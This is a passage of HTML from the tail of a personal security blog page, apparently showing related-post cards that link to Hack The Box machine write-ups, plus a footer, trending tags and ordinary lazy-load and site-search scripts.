class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Admirer write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was one of the most interesting machines I’ve solved in Hack The Box, learned some cool techniques. It taught me how recon never ends, despite having foun...</p></div></div></a></div><div class="card"> <a href="/posts/Jarvis/"><div class="card-body"> <span class="timeago small"> Jul 4, 2019 <i class="unloaded">2019-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Jarvis write-up</h3><div class="text-muted small"><p>Hack The Box: Jarvis machine write-up Jarvis was one of the funniest and most interesting machines I’ve done so far. I learned a lot from it. It starts with a SQL injection that can be exploited t...</p></div></div></a></div><div class="card"> <a href="/posts/Craft/"><div class="card-body"> <span class="timeago small"> Jul 26, 2019 <i class="unloaded">2019-07-26T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Craft write-up</h3><div class="text-muted small"><p>Hack The Box: Craft machine write-up Craft is a medium-rated machine which I found really realistic in the sense that we enumerate an initial webpage to find two domains, one has a gogs instance (...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
